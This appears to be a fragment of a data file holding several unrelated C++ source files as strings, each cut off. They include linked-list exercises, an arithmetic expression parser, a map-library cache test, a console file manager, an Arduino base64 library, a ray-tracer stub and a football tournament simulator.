the [1] vertex is on the inside\n        // (already reached from the start index i),\n        // and the [0] vertex is on the outside,\n        // then we will add the [0] vertex to the\n        // frontier set and record its distance.\n\n        // You don't need to edit this part:\n\n        // (The code below is similar to the\n        // previous case above, but we're acting\n        // on vertex [0].)\n\n        if (f == -1) {\n          f = edges[j][0];\n        }\n        else {\n          dsunion(f,edges[j][0]);\n        }\n\n        distance[edges[j][0]] = d;\n      }\n\n      // If neither one of the two cases above was\n      // applicable, then we implicitly do nothing\n      // in this iteration.\n    }\n\n    // After looping over th",
    "#include<iostream>\nusing namespace std;\n\nclass DounlyLinkedList{\nprivate:\n    class Node{\n    public:\n        int Data;\n        Node* Next;\n        Node* Prev;\n    };\n\n    Node *Head;\n    Node *Tail;\n    int Length;\n\npublic:    \n    DounlyLinkedList(){\n        Head = Tail = NULL;\n        Length = 0;\n    }\n\n    void insertFirst(int element) {\n        Node *newNode = new Node;  \n        newNode->Data = element; \n        newNode->Next = Head;\n        newNode->Prev = NULL; \n        \n        if (Head != NULL) {\n            Head->Prev = newNode;\n        } else {\n            // If the list was empty, newNode is both Head and Tail\n            Tail = newNode;\n        }\n    \n        Head = newNode; \n        Length++;\n}\n\n    void insertLast(int element) {\n\n        Node *newNode = new Node;\n        newNode->Data = element;\n        newNode->Next = NULL;\n\n        if (Head == NULL) {\n            Head = Tail = newNode;\n            newNode->Prev=NULL;\n        } else {\n            newNode->Prev=Tail;\n            Tail->Next = newNode;\n            Tail = newNode;\n        }\n        Length++;\n    }\n\n    void insertAtPos(int element, int Pos) {\n        if (Pos == 0) {\n            insertFirst(element);\n        } else if (Pos == Length) {\n            insertLast(element);\n        } else if (Pos > Length || Pos < 0) {\n            cout << \"Position out of range\" << endl;\n        } else {\n            Pos--; // Adjusting position to match zero-based indexing\n            Node *newNode = new Node;\n            newNode->Data = element;\n\n            Node *Temp = Head;\n            while (Pos--) {\n                Temp = Temp->Next;\n            }\n            newNode->Next = Temp->Next;\n            Temp->Next->Prev = newNode;\n            newNode->Prev = Temp;\n            Temp->Next = newNode;\n\n            Length++;\n        }\n    }\n\n    void removeFirst(){\n        if (Head==NULL){\n            cout<<\"The list is aready empty\\n\";\n        }else if (Head==Tail){\n            delete Head;\n            Head = Tail = NULL;\n\n            Length--;\n        }else {\n            Node *Temp = Head;\n            Head = Head->Next;\n            if (Head != NULL) {\n                Head->Prev = NULL;\n            } else {\n                // If Head->Next is NULL, Head is now the only node in the list\n                Tail = NULL;\n            }\n            delete Temp;\n            Length--;\n        }\n    }\n\n    void removeLast(){\n        if (Tail==NULL){\n            cout<<\"The list is aready empty\\n\";\n        }else if (Tail==Head){\n            delete Tail;\n            Tail = Head = NULL;\n            Length--;\n        }else{\n            Node *Temp = Tail;\n            Tail = Tail->Prev;\n            if (Tail != NULL) {\n                Tail->Next = NULL;\n            }else{\n                // If Tail->Prev is NULL, Tail is now the only node in the list\n                Head = NULL;\n            }       \n            delete Temp;\n\n            Length--;\n        }\n    }\n    \n    void removeAtPos(int Pos){\n       if (Pos==0){\n            removeFirst();\n        }else if (Pos == Length - 1) {\n            removeLast();\n        }else if (Pos>Length || Pos<0){\n            cout<<\"Position out of range\"<<endl;\n        }else{\n            Pos--; // Adjusting position to match zero-based indexing\n            \n            Node *Temp = Head;\n            while (Pos--){\n                Temp=Temp->Next;\n            }\n\n            Node *ToDelete = Temp->Next;\n            Temp->Next = Temp->Next->Next;\n\n            if (Temp->Next != NULL) {\n                Temp->Next->Prev = Temp;\n            } else {\n                // If the next node is NULL, the deleted node was the previous Tail\n                Tail = Temp;\n            }\n            \n            delete ToDelete;\n            Length--;\n        }        \n    }\n\n    int getLength(){\n        int len=0;\n        Node *currentNode = Head;\n        while (currentNode!= NULL){\n            len++;\n            currentNode = currentNode->Next;\n        }\n        return len;\n    }\n\n    void atPos(int Pos){\n        \n        if (Pos==0){\n            cout<<Head->Data<<endl; \n        }else if (Pos==this->getLength()-1){\n            cout<<Tail->Data<<endl;\n        }else if (Pos>=this->getLength()){\n            cout<<\"Position out of range\"<<endl;\n        }else{\n            Node *Temp = Head;\n            while (Pos--){\n                Temp=Temp->Next;\n            }\n            cout<<Temp->Data<<endl;\n        }\n    }\n\n    int find(int element){\n        Node *Temp=Head;\n        int index=0;\n        while (Temp!=NULL){\n            if (Temp->Data==element){\n                return index; \n            }\n            Temp=Temp->Next;\n            index++;\n        }\n        return -1;\n    }\n\n    void traverseForward(){\n        if (Head == NULL){\n            cout << \"List is empty\" << endl;\n            return;\n        }\n        Node *currentNode = Head;\n        while (currentNode->Next != NULL){\n            cout << currentNode->Data << \" -> \";\n            currentNode = currentN",
    "/*\n * AritMix - Analisador de expressoes aritmeticas In-Fixas.\n * Prof.: Cleuton Sampaio\n * (ANSI C++ com C++ Standard Template Library)\n *\n * Vers\u00e3o atual: 1.0 - Marco 2003\n *\n * Operadores aritmeticos:\n *     \"+\" -> Soma\n *     \"-\" -> Subtracao\n *     \"*\" -> Multiplicao\n *     \":\" -> Divisao\n *     \"^\" -> Exponenciao\n *\n * Aceita parentesis\n *\n * Casos de teste (ja\ufffd calculados):\n * 1+2 = 3\n * 1--3 = ERRO!\n * ((5-3) * (2*3) -1) = 11\n * 1:(5^(3-2)+1) = 0,166666667\n * 4^(1:2) = 2\n * ((1 + 2) * (6/2)) = ERRO!\n * (1+2)^((4-2) * (1+2)) = 729\n * -3 *(-2*5)^2 = -300\n *\n * Uso: aritmix [opcoes]\n * -d = debug: imprimir calculos e pilha\n * -t = executar os testes: roda as expressoes de teste acima.\n *\n */\n\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <stack>\n#include <vector>\n#include <cctype>\n#include <cmath>\n\nusing namespace std;\n\nbool debug = false;\nbool runTests = false;\n\n#define DEBUG(msg) if (debug) cout << endl << msg << endl;\n#define ERRO(msg) cout << endl << \"**** ERRO: \" << msg << endl;\n\n\n\ntypedef struct elementoStruct {\n        bool fim;\n        bool erro;\n        bool eOperando;\n        double operando;\n        bool eOperador;\n        char operador;} TElemento;\n\nstack <double> pilha;\nvector <TElemento> listaPosFixa;\nstack <char> pilhaOperadores;\n\nvoid parseArgs(int qtde, char* args[]) {\n     for (int x = 0; x < qtde; x++) {\n         string arg (args[x]);\n         if (arg == \"-d\") {\n            debug = true;\n         }\n         if (arg == \"-t\") {\n        \t runTests = true;\n         }\n     }\n}\n\nvoid posfixa ( double operando ) {\n       pilha.push(operando);\n}\n\n\nvoid posfixa ( char operador ) {\n       double op2 = pilha.top();\n       pilha.pop();\n       double op1 = pilha.top();\n       pilha.pop();\n       double resultado = 0.0;\n       stringstream ss1;\n       string msg;\n       if (operador == '+') {\n          resultado = op1 + op2;\n       }\n       else if (operador == '*') {\n               resultado = op1 * op2;\n            }\n            else if (operador == ':' || operador == '/') {\n                    resultado = op1 / op2;\n                 }\n                 else if (operador == '^') {\n                         resultado = pow(op1,op2);\n                      }\n                      else  if (operador == '-') {\n                               resultado = op1 - op2;\n                            }\n                            else if (operador == '^') {\n                            \t\tresultado = pow(op1,op2);\n                            }\n                            else {\n                                 ERRO(\"**** Operador invalido: \" + operador);\n                                 return;\n                            }\n       ss1 << \"CALCULAR: \" << operador\n                          << \"(\" << op1 << \", \" << op2\n                          << \")\" << \" = \" << resultado;\n       getline(ss1, msg);\n       DEBUG(msg);\n\n       pilha.push(resultado);\n}\n\nbool isOperador ( char pos ) {\n     bool retorno = false;\n     if (pos == '+' || pos == '-' || pos == '^' ||\n         pos == '*' || pos == ':' || pos == '/' ||\n         pos == '^' ||\n         pos == '(' || pos == ')') {\n         retorno = true;\n     }\n     return (retorno);\n}\n\nTElemento parse (string expressao, int &posicao) {\n       TElemento elem = {false, false, false, 0.0, false, 0};\n       string operando = \"\";\n\n       stringstream stream;\n       while (true) {\n             if ((unsigned) posicao >= expressao.length()) {\n                if (operando.length() > 0) {\n                   stream << operando;\n                   stream >> elem.operando;\n                   elem.eOperando = true;\n                   break;\n                }\n                elem.fim = true;\n                break;\n             }\n             if (isdigit(expressao[posicao]) || expressao[posicao] == '.') {\n                operando += expressao[posicao];\n                posicao++;\n             }\n             else if (isOperador(expressao[posicao])) {\n\n                     if (operando.length() > 0) {\n                        // retorna o operando\n                        stream << operando;\n                        stream >> elem.operando;\n                        elem.eOperando = true;\n                        break;\n                     }\n                     else {\n                          // retorna o operador\n                          elem.eOperador = true;\n                          elem.operador = expressao[posicao];\n                          posicao++;\n                          break;\n                     }\n                  }\n                  else {\n                       // \u00e9 whitespace\n                \t  if (!isspace(expressao[posicao]) ) {\n                \t\t  cout << endl << \"**** ERRO: caracter invalido na expressao: \"\n                \t\t  \t   << expressao[posicao] << \" na posicao: \" << posicao <<\n                \t\t  \t   endl << \"[[\" << expressao << \"]]\";\n\n                \t\t  elem.erro = true;\n                \t\t  break;\n                \t  }\n                \t  posicao++",
    "#include <mbgl/storage/file_source_manager.hpp>\n#include <mbgl/storage/resource.hpp>\n#include <mbgl/storage/resource_options.hpp>\n#include <mbgl/test/util.hpp>\n#include <mbgl/util/run_loop.hpp>\n#include <mbgl/util/timer.hpp>\n\n#include <gtest/gtest.h>\n\nusing namespace mbgl;\n\nTEST(DatabaseFileSource, PauseResume) {\n    util::RunLoop loop;\n\n    std::shared_ptr<FileSource> dbfs =\n        FileSourceManager::get()->getFileSource(FileSourceType::Database, ResourceOptions{});\n    dbfs->pause();\n\n    const Resource res{Resource::Unknown, \"http://127.0.0.1:3000/test\", {}, Resource::LoadingMethod::CacheOnly};\n    auto req = dbfs->request(res, [&](const Response&) { loop.stop(); });\n\n    util::Timer resumeTimer;\n    resumeTimer.start(Milliseconds(5), Duration::zero(), [dbfs] { dbfs->resume(); });\n\n    loop.run();\n}\n\nTEST(DatabaseFileSource, VolatileResource) {\n    util::RunLoop loop;\n\n    std::shared_ptr<FileSource> dbfs =\n        FileSourceManager::get()->getFileSource(FileSourceType::Database, ResourceOptions{});\n\n    Resource resource{Resource::Unknown, \"http://127.0.0.1:3000/test\", {}, Resource::LoadingMethod::CacheOnly};\n    Response response{};\n    response.data = std::make_shared<std::string>(\"Cached value\");\n    std::unique_ptr<mbgl::AsyncRequest> req;\n\n    dbfs->forward(resource, response, [&] {\n        req = dbfs->request(resource, [&](Response res1) {\n            EXPECT_EQ(nullptr, res1.error);\n            ASSERT_TRUE(res1.data.get());\n            EXPECT_FALSE(res1.noContent);\n            EXPECT_EQ(\"Cached value\", *res1.data);\n            resource.storagePolicy = Resource::StoragePolicy::Volatile;\n            req = dbfs->request(resource, [&](Response res2) {\n                req.reset();\n                ASSERT_TRUE(res2.error.get());\n                EXPECT_TRUE(res2.noContent);\n                EXPECT_EQ(Response::Error::Reason::NotFound, res2.error->reason);\n                EXPECT_EQ(\"Not found in offline database\", res2.error->message);\n                loop.stop();\n            });\n        });\n    });\n    loop.run();\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <fstream>\r\n#include <filesystem>\r\n\r\nusing namespace std;\r\n\r\nbool createDirectory(const std::string& folderName) \r\n{\r\n    if (CreateDirectoryA(folderName.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS) \r\n        return true;\r\n    \r\n    return false;\r\n}\r\n\r\nvoid createFileInDirectory(const std::string& directory, const std::string& fileName,std::string &content)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\"+ directory;  //put the path of your file in the pc\r\n    std::string filePath = directoryPath + \"\\\\\" + fileName;\r\n    std::ofstream outputFile(filePath);\r\n\r\n    if (outputFile.is_open())\r\n    {\r\n        cout << \"File created successfully in directory: \" << directory << endl;\r\n        outputFile << content;\r\n        outputFile.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to create the file in directory: \" << directory << endl;\r\n    }   \r\n}\r\n\r\nvoid ReadFile(const std::string &directory,const std::string& inputFile)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory;\r\n    std::string filePath = directoryPath + \"\\\\\" + inputFile;\r\n    std::ifstream inputFileStream(filePath);\r\n\r\n    if (inputFileStream.is_open())\r\n    {\r\n       cout << \"\\nContent of the file:\\n\";\r\n\r\n        std::string line;\r\n        while (std::getline(inputFileStream, line)) \r\n        {\r\n            cout << line << '\\n';\r\n        }\r\n        inputFileStream.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to open the file for reading.\\n\";\r\n    }\r\n}\r\n\r\nvoid CopyFile(const string& directory1, const string& directory2, const string& file1, const string& file2)\r\n{\r\n    fstream f1, f2;\r\n    string ch;\r\n\r\n    string filePath1 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory1 + \"\\\\\" + file1;\r\n\r\n    f1.open(filePath1, ios::in);\r\n\r\n    if (!f1.is_open()) {\r\n        cout << \"Error opening source file: \" << filePath1 << endl;\r\n        return;\r\n    }\r\n\r\n    string filePath2 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory2 + \"\\\\\" + file2;\r\n\r\n    f2.open(filePath2, ios::out);\r\n\r\n    if (!f2.is_open()) {\r\n        cout << \"Error opening destination file: \" << filePath2 << endl;\r\n        f1.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(f1, ch))\r\n    {\r\n        f2 << ch << endl;\r\n    }\r\n\r\n    f1.close();\r\n    f2.close();\r\n\r\n    f2.open(filePath2, ios::in);\r\n\r\n    while (getline(f2, ch))\r\n    {\r\n        cout << ch << endl;\r\n    }\r\n\r\n    f2.close();\r\n}\r\n\r\nvoid MoveFile(const string& sourceDirectory, const string& destinationDirectory, const string& sourceFile, const string& destinationFile)\r\n{\r\n    fstream sourceFileStream, destinationFileStream;\r\n    string line;\r\n\r\n    string sourceFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + sourceDirectory + \"\\\\\" + sourceFile;\r\n\r\n    sourceFileStream.open(sourceFilePath, ios::in);\r\n\r\n    if (!sourceFileStream.is_open()) {\r\n        cout << \"Error opening source file: \" << sourceFilePath << endl;\r\n        return;\r\n    }\r\n\r\n    string destinationFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + destinationDirectory + \"\\\\\" + destinationFile;\r\n\r\n    destinationFileStream.open(destinationFilePath, ios::out);\r\n\r\n    if (!destinationFileStream.is_open()) {\r\n        cout << \"Error opening destination file: \" << destinationFilePath << endl;\r\n        sourceFileStream.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(sourceFileStream, line))\r\n    {\r\n        destinationFileStream << line << endl;\r\n    }\r\n\r\n    sourceFileStream.close();\r\n    destinationFileStream.close();\r\n\r\n    if (remove(sourceFilePath.c_str()) != 0) {\r\n        cout << \"Error deleting source file: \" << sourceFilePath << endl;\r\n    }\r\n    else {\r\n        cout << \"File moved successfully.\" << endl;\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    int choice;\r\n\r\n    do\r\n    {\r\n        cout << \"Which operation do you perform: \" << endl;\r\n        cout << \"1) Create Directory\" << endl;\r\n        cout << \"2) Create File in a Directory\" << endl;\r\n        cout << \"3) Read File\" << endl;\r\n        cout << \"4) Move File\" << endl;\r\n        cout << \"5) Copy File\" << endl;\r\n        cout << \"Enter 0 to Exit\" << endl;\r\n        cout << \"Enter your option\" << endl;\r\n        cin >> choice;\r\n        cin.ignore();\r\n\r\n        if(choice==1)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            createDirectory(directory_name);\r\n           \r\n        }\r\n        else if(choice ==2)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            string file_name;\r\n            cout << \"Enter the name of the file\" << endl;\r\n            cin >> file_name;\r\n            std::string content=\"i am c",
    "/*\n * Copyright (c) 2013 Adam Rudd.\n * See LICENSE for more information\n * https://github.com/adamvr/arduino-base64 \n */\n#if (defined(__AVR__))\n#include <avr\\pgmspace.h>\n#else\n#include <pgmspace.h>\n#endif\n\nconst char PROGMEM b64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\t\t\"abcdefghijklmnopqrstuvwxyz\"\n\t\t\"0123456789+/\";\n\n/* 'Private' declarations */\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3);\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4);\ninline unsigned char b64_lookup(char c);\n\nint base64_encode(char *output, char *input, int inputLen) {\n\tint i = 0, j = 0;\n\tint encLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\twhile(inputLen--) {\n\t\ta3[i++] = *(input++);\n\t\tif(i == 3) {\n\t\t\ta3_to_a4(a4, a3);\n\n\t\t\tfor(i = 0; i < 4; i++) {\n\t\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[i]]);\n\t\t\t}\n\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif(i) {\n\t\tfor(j = i; j < 3; j++) {\n\t\t\ta3[j] = '\\0';\n\t\t}\n\n\t\ta3_to_a4(a4, a3);\n\n\t\tfor(j = 0; j < i + 1; j++) {\n\t\t\toutput[encLen++] = pgm_read_byte(&b64_alphabet[a4[j]]);\n\t\t}\n\n\t\twhile((i++ < 3)) {\n\t\t\toutput[encLen++] = '=';\n\t\t}\n\t}\n\toutput[encLen] = '\\0';\n\treturn encLen;\n}\n\nint base64_decode(char * output, char * input, int inputLen) {\n\tint i = 0, j = 0;\n\tint decLen = 0;\n\tunsigned char a3[3];\n\tunsigned char a4[4];\n\n\n\twhile (inputLen--) {\n\t\tif(*input == '=') {\n\t\t\tbreak;\n\t\t}\n\n\t\ta4[i++] = *(input++);\n\t\tif (i == 4) {\n\t\t\tfor (i = 0; i <4; i++) {\n\t\t\t\ta4[i] = b64_lookup(a4[i]);\n\t\t\t}\n\n\t\t\ta4_to_a3(a3,a4);\n\n\t\t\tfor (i = 0; i < 3; i++) {\n\t\t\t\toutput[decLen++] = a3[i];\n\t\t\t}\n\t\t\ti = 0;\n\t\t}\n\t}\n\n\tif (i) {\n\t\tfor (j = i; j < 4; j++) {\n\t\t\ta4[j] = '\\0';\n\t\t}\n\n\t\tfor (j = 0; j <4; j++) {\n\t\t\ta4[j] = b64_lookup(a4[j]);\n\t\t}\n\n\t\ta4_to_a3(a3,a4);\n\n\t\tfor (j = 0; j < i - 1; j++) {\n\t\t\toutput[decLen++] = a3[j];\n\t\t}\n\t}\n\toutput[decLen] = '\\0';\n\treturn decLen;\n}\n\nint base64_enc_len(int plainLen) {\n\tint n = plainLen;\n\treturn (n + 2 - ((n + 2) % 3)) / 3 * 4;\n}\n\nint base64_dec_len(char * input, int inputLen) {\n\tint i = 0;\n\tint numEq = 0;\n\tfor(i = inputLen - 1; input[i] == '='; i--) {\n\t\tnumEq++;\n\t}\n\n\treturn ((6 * inputLen) / 8) - numEq;\n}\n\ninline void a3_to_a4(unsigned char * a4, unsigned char * a3) {\n\ta4[0] = (a3[0] & 0xfc) >> 2;\n\ta4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);\n\ta4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);\n\ta4[3] = (a3[2] & 0x3f);\n}\n\ninline void a4_to_a3(unsigned char * a3, unsigned char * a4) {\n\ta3[0] = (a4[0] << 2) + ((a4[1] & 0x30) >> 4);\n\ta3[1] = ((a4[1] & 0xf) << 4) + ((a4[2] & 0x3c) >> 2);\n\ta3[2] = ((a4[2] & 0x3) << 6) + a4[3];\n}\n\ninline unsigned char b64_lookup(char c) {\n\tif(c >='A' && c <='Z') return c - 'A';\n\tif(c >='a' && c <='z') return c - 71;\n\tif(c >='0' && c <='9') return c + 4;\n\tif(c == '+') return 62;\n\tif(c == '/') return 63;\n\treturn -1;\n}",
    "#include <iostream>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node *next;\n    Node *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode()\n{\n    Node *newNode = new Node();\n    cout << \"\\nEnter the roll number of the student: \";\n    cin >> newNode->noMhs;\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;\n\n    if (START == NULL || newNode->noMhs <= START->noMhs)\n    {\n        if (START != NULL && newNode->noMhs == START->noMhs)\n        {\n            cout << \"\\033[31mDuplicate roll numbers not allowed\\033[0m\" << endl;\n            return;\n        }\n\n        newNode->next = START;\n        if (START != NULL)\n        {\n            START->prev = newNode;\n        }\n        newNode->prev = NULL;\n        START = newNode;\n    }\n    else\n    {\n        Node *current = START;\n        Node *previous = NULL;\n\n        while (current != NULL && current->noMhs < newNode->noMhs)\n        {\n            previous = current;\n            current = current->next;\n        }\n\n        newNode->next = current;\n        newNode->prev = previous;\n\n        if (current != NULL)\n        {\n            current->prev = newNode;\n        }\n        if (previous != NULL)\n        {\n            previous->next = newNode;\n        }\n        else{\n            START = newNode;\n        }\n\n    }\n\n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted:\";\n    cin >> rollNo;\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START;\n    previous = NULL;\n\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" <<endl;\n        return;\n    }\n\n    if (current == START)\n    {\n        START = START->next;\n        if (START != NULL)\n        {\n            START->prev = NULL;\n        }\n    }\n    else \n    {\n        previous->next = current->next;\n        if (current->next != NULL)\n        {\n            current->next->prev = previous;\n        }\n    }\n    delete current;\n    cout << \"\\x1b{32mRecord with roll number\" << rollNo << \"deleted\\x1b[0m\" << endl;\n\n\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nrecords in ascending order of roll number are:\" << endl;\n        Node *currentNode = START;\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->next;\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are:\" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n    }\n}\n\nvoid searchData()\n{\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node *prev, *curr;\n    prev = curr = NULL;\n    cout << \"\\nEnter the roll number of the student whose record you want to search:\";\n    int num;\n    cin >> num;\n    if (search(num, &prev, &curr) == false)\n    cout << \"\\nRecord not found\" << endl;\n    else\n    {\n        cout << \"\\nRecord found\" << endl;\n        cout << \"\\nRoll number: \" << endl;\n        cout << \"\\nName:\" << endl;\n    }\n}\n\nint main()\n{\n    while (true)\n   {\n    try\n    {\n        cout << \"\\nMenu\" << endl;\n        cout << \"1. Add a record from the list\" << endl;\n        cout << \"2. Delete a record from the list\" << endl;\n        cout << \"3. View all records in ascending order of roll numbers\" << endl;\n        cout << \"4. View all records in descending order of roll numbers\" << endl;\n        cout << \"5. Search for a record in the list \" << endl;\n        cout << \"6. Exit\" << endl;\n        cout << \"\\nEnter your choice (1-6):\";\n        char ch;\n        cin >> ch;\n\n        switch (ch)\n        {\n            case '1':\n                addNode();\n                break;\n            case '2':\n                deleteNode();\n                break;\n            case '3':\n                traverse();\n                break;\n            case '4':\n                revtraverse();\n                break;\n            case '5':\n                searchData();\n                break;\n            case '6':\n                return 0;\n            default:\n                cout << \"\\nInvalid option\" << endl;\n  ",
    "#include \"SFML/Graphics/PrimitiveType.hpp\"\n#include \"SFML/Graphics/VertexArray.hpp\"\n#include \"SFML/System/Vector3.hpp\"\n#include <iostream>\n#include <SFML/Window.hpp>\n#include <SFML/Graphics.hpp>\n\nint main(void)\n{\n    sf::VertexArray drawPallette(sf::Points);\n    \n\n    auto aspectRatio = 16.0f / 9.0f;\n    int imageWidth = 400;\n\n    int imageHeight = static_cast<int>(imageWidth / aspectRatio);\n    imageHeight = (imageHeight < 1) ? 1 : imageHeight;\n\n    auto focalLength = 1.0f;\n    auto viewportHeight = 2.0f;\n    // auto viewportWidth = aspectRatio * viewportHeight;\n    auto viewportWidth = viewportHeight * (static_cast<float>(imageWidth / imageHeight));\n    auto cameraOrigin = sf::Vector3f(0.0f, 0.0f, 0.0f);\n\n    auto viewportU  = sf::Vector3f(viewportWidth, 0.0f, 0.0f);\n    auto viewportV  = sf::Vector3f(0.0f, -viewportHeight, 0.0f);\n\n    auto pixelDeltaU = viewportU / static_cast<float>(imageWidth);\n    auto pixelDeltaV = viewportV / static_cast<float>(imageHeight);\n\n    auto viewportUpperLeft = cameraOrigin - sf::Vector3f(0,0, focalLength) - (viewportU / 2.0f) + (viewportV / 2.0f);\n    auto pixel00Loc = viewportUpperLeft + 0.5f * pixelDeltaU - 0.5f * pixelDeltaV;\n\n    sf::RenderWindow window(sf::VideoMode(800, 600), \"SFML works!\");\n    window.setFramerateLimit(60);\n\n    while (window.isOpen())\n    {\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(drawPallette);\n        window.display();\n    }\n\n    return 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <cstdlib>\n#include <ctime>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Equipo {\n    string nombre;\n    string estadio;\n    int puntos;\n    int golesMarcados;\n    bool eliminado;\n};\n\nvoid jugarPartido(Equipo &equipoLocal, Equipo &equipoVisitante, const string &estadio, bool faseEliminatoria) {\n    equipoLocal.golesMarcados = rand() % 5;\n    equipoVisitante.golesMarcados = rand() % 5;\n\n    cout << equipoLocal.nombre << \" \" << equipoLocal.golesMarcados << \" - \" << equipoVisitante.golesMarcados << \" \" << equipoVisitante.nombre << \"   - \" << estadio << endl;\n\n    if (faseEliminatoria) {\n        if (equipoLocal.golesMarcados == equipoVisitante.golesMarcados) {\n            // En caso de empate, jugamos una tanda de penales hasta que haya un ganador\n            while (equipoLocal.golesMarcados == equipoVisitante.golesMarcados) {\n                equipoLocal.golesMarcados = rand() % 6; // Nuevo resultado de penales para el equipo local\n                equipoVisitante.golesMarcados = rand() % 6; // Nuevo resultado de penales para el equipo visitante\n            }\n\n            cout << \"\u00a1Vamos a la tanda de penales!\\n\";\n            cout << \"Goles en penales: \" << equipoLocal.nombre << \" \" << equipoLocal.golesMarcados << \" - \" << equipoVisitante.golesMarcados << \" \" << equipoVisitante.nombre << endl;\n\n            if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n                equipoLocal.puntos += 2;\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 2;\n                equipoLocal.eliminado = true;\n            }\n        } else {\n            if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n                equipoLocal.puntos += 3;\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 3;\n                equipoLocal.eliminado = true;\n            }\n        }\n    } else {\n        if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n            equipoLocal.puntos += 3;\n        } else if (equipoLocal.golesMarcados < equipoVisitante.golesMarcados) {\n            equipoVisitante.puntos += 3;\n        } else {\n            equipoLocal.puntos += 1;\n            equipoVisitante.puntos += 1;\n        }\n    }\n}\n\nvoid simularFaseGrupos(vector<vector<Equipo>> &grupos) {\n    for (size_t i = 0; i < grupos.size(); ++i) {\n        cout << \"---- Grupo \" << (i + 1) << \" ----\\n\";\n\n        int numEquipos = grupos[i].size();\n\n        for (int j = 0; j < numEquipos; ++j) {\n            for (int k = j + 1; k < numEquipos; ++k) {\n                jugarPartido(grupos[i][j], grupos[i][k], grupos[i][j].estadio, false);\n            }\n        }\n\n        sort(grupos[i].begin(), grupos[i].end(), [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        cout << \"\\nTabla de posiciones del grupo \" << (i + 1) << \"\\n\";\n        cout << \"Equipo\\t\\tPuntos\\n\";\n        for (const auto &equipo : grupos[i]) {\n            cout << equipo.nombre << \"\\t\\t\" << equipo.puntos << \"\\n\";\n        }\n        cout << \"------------------------\\n\\n\";\n    }\n}\n\nvoid simularEliminatorias(vector<Equipo> &equipos, const string &nombreRonda, bool faseEliminatoria) {\n    cout << \"\\n  \" << nombreRonda << \"   \\n\";\n\n    random_shuffle(equipos.begin(), equipos.end());\n\n    for (int i = 0; i < equipos.size(); i += 2) {\n        if (!equipos[i].eliminado && !equipos[i + 1].eliminado) {\n            jugarPartido(equipos[i], equipos[i + 1], equipos[i].estadio, faseEliminatoria);\n        }\n    }\n}\n\nvoid generarGrupos(vector<Equipo> &equipos, vector<vector<Equipo>> &grupos) {\n    int numGrupos = equipos.size() / 4;\n    grupos.resize(numGrupos);\n\n    for (int i = 0; i < numGrupos; ++i) {\n        sort(equipos.begin() + i * 4, 